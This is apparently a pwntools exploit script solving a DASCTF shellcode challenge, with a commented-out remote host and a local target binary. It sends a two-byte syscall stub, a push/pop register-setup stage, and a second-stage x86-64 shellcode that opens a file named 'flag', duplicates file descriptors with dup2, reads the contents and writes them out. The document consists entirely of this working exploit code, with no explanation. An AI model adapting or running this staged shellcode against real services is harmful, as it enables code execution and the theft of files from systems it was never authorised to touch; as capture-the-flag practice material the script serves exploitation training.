from pwn import *
import warnings
warnings.filterwarnings("ignore", category=BytesWarning)

context(arch="amd64", log_level="debug")

#p = remote("tcp.cloud.dasctf.com", 27135)
p = process('./shellcode')
p.sendafter("[2] Input: (ye / no)", b"\x0f\x05") 

sc1 = asm("""
push rax
pop rsi
push rbx
pop rax
push rbx
pop rdi

pop rbx
pop rbx
pop rsp
pop rdx

push rsi
pop rsp
pop rbx
pop rbx
pop rbx
push rdx
push rdx
""")

p.sendafter("[5] ======== Input Your P0P Code ========", sc1)

sc2 = "nop\n"*0x12
sc2 += """
mov rsp, r12

mov rax, 0x67616c662f
push rax
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall

mov rdi, rax
mov rsi, 0
mov rax, 33
syscall

mov rdi, 1
mov rsi, 23
mov rax, 33
syscall

mov rdi, 0
mov rsi, rsp
mov rdx, 0x100
mov rax, 0
syscall

mov rdi, 23
mov rax, 1
syscall
"""

p.send(asm(sc2))

p.interactive()
